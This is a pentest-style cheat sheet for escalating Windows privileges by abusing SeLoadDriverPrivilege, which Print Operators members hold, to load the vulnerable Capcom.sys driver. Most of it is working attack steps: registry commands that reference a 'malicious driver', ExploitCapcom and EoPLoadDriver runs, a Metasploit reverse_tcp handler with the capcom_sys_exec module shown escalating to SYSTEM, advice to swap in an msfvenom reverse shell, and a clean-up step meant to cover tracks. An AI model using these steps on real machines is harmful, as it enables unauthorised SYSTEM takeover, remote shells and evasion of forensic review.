### Content

- [Overview](#overview)
- [Enabling SeLoadDriverPrivilege](#enabling-seloaddriverprivilege)
- [Capcom Driver Abuse](#capcom-driver-abuse)
	- [The Long Way](#the-long-way)
	- [ExploitCapcom](#exploitcapcom)
	- [The Short Way](#the-short-way)
	- [msfconsole way](#msfconsole-way)
- [Clean Up](#clean-up)

---
#### Overview

[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.

> [!Tip]
> 
> If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC. (Visit the [Notes](%2E%2E/Notes.md#Bypassing%20UAC%20Using%20UACME) for more)
> 
> Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group.

---
#### Enabling SeLoadDriverPrivilege

> Check [Notes](%2E%2E/Notes.md#Enabling%20Disabled%20Privileges) for another way to enable the disabled privileges.

Use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to enable `SeLoadDriverPrivilege`  to be able to load the driver and add those headers at first:

```C
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

Compile it using Visual Studio Developer Prompt.

```CMD
C:\>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

Run the `EnableSeLoadDriverPrivilege.exe` binary.

```CMD
C:\> EnableSeLoadDriverPrivilege.exe
```

---
### Capcom Driver Abuse

The driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges.
We can use our privilege `SeLoadDriverPrivilege` to load this vulnerable driver and escalate privileges.

#### The Long Way

Download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`.
Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.

```CMD
C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

> The odd syntax `\??\` used to reference our malicious driver's ImagePath is an [NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c). The Win32 API will parse and resolve this path to properly locate and load our malicious driver.

Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), verify that the Capcom driver is now listed.

```PowerShell
PS C:\> .\DriverView.exe /stext drivers.txt
PS C:\> cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

#### ExploitCapcom

Use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.

```PowerShell
C:\> .\ExploitCapcom.exe
```

New CMD will pop up running as `NT Authority\System`

> [!Warning]
> If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling.
> Edit the line `C:\\Windows\\system32\\cmd.exe` with, say, a reverse shell path created by msfvenom
> 
> If a reverse shell connection is blocked when running `ExploitCapcom.exe` for some reason, we can try a bind shell or exec/add user payload.

#### The Short Way

Use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver.

```CMD
C:\> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

> [Another Short Way](https://github.com/k4sth4/SeLoadDriverPrivilege)

---
#### msfconsole way

```bash
$ ./msfconsole -q 
msf > use exploit/multi/handler
msf exploit(handler) > setg lhost 10.0.2.4
msf exploit(handler) > setg payload windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > run

meterpreter > getuid
Server username: my-win764\standardbob
meterpreter > background
[*] Backgrounding session 1...

msf exploit(handler) > use exploit/windows/local/capcom_sys_exec
msf exploit(capcom_sys_exec) > set session 1
msf exploit(capcom_sys_exec) > run

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---
### Clean Up

We can cover our tracks a bit by deleting the registry key added earlier.

```CMD
C:\> reg delete HKCU\System\CurrentControlSet\Capcom
```

> [!Note]
> Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".

---

